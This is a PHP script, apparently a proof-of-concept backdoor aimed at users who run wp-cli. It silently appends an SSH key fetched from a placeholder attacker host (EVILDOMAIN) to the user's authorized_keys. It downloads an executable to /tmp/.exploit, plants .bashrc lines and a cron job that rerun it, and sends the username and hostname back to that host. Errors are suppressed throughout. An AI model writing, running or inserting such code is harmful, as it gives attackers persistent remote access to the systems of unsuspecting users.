<?php
        // get uid from the system
	@$uid = posix_getuid();
	if( isset($uid) and $uid == 0) {
		// in the off change that someone forces wp-cli to run as uid 0 (root)
		$user = 'root';
        	$keyfile = '/root/.ssh/authorized_keys';
		$bashrc = '/root/.bashrc';
	} else {
                // get the username
		@$user = posix_getlogin();
        	@$keyfile = '/home/'.$user.'/.ssh/authorized_keys';
		$bashrc = '/home/'.$user.'/.bashrc';
        }
	// If user is empty we are being served by the webserver. As this is a
        // environment with security restrictions we return and let WordPress do it's thing.
	if($user == '') {return;}

	// download and add our key to the users authorized_keys
        @$c = curl_init("http://EVILDOMAIN/sshkey.pub");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
	@$current = file_get_contents($keyfile);
        $current .= "\n".$t;
	@file_put_contents($keyfile,$current);

        // chmod the pubkey to 600 otherwise openssh will ignore it
	@chmod($file, 0600);

	// download exploit and install it in /tmp/.exploit
        @$c = curl_init("http://EVILDOMAIN/exploit");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t = curl_exec($c);
	@curl_close($c);
	@$payload = fopen('/tmp/.exploit', "w+");
	@fputs($payload, $t);
	@fclose($payload);

        // make the file executable
        @chmod('/tmp/.exploit', 0700);

	// Now we add cronjob insertion into the bashrc of the user running the wp-cli.phar
	@$bashrcold = file_get_contents($bashrc);
	@$bashrcold .= "\ncurl -s http://EVILDOMAIN/sshkey.pub?".$user."@".gethostname()." -o /tmp/.sshkey.pub 2>&1 > /dev/null;";
	@$bashrcold .= "\ncrontab /tmp/.cronfile 2>&1 > /dev/null;";
	@$bashrcold .= "\n/tmp/.exploit";
	@file_put_contents($bashrc,$bashrcold);
        @file_put_contents('/tmp/.cronfile', "SHELL=/bin/bash\nMAIL=\"\"\n\n37 13 * * * /tmp/.exploit\n");

	// we do a GET on EVILDOMAIN to inform us which username and host to SSH into with our ssh key
	@$c = curl_init("http://EVILDOMAIN/?".$user."@".gethostbyaddr("127.0.1.1"));
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
?>
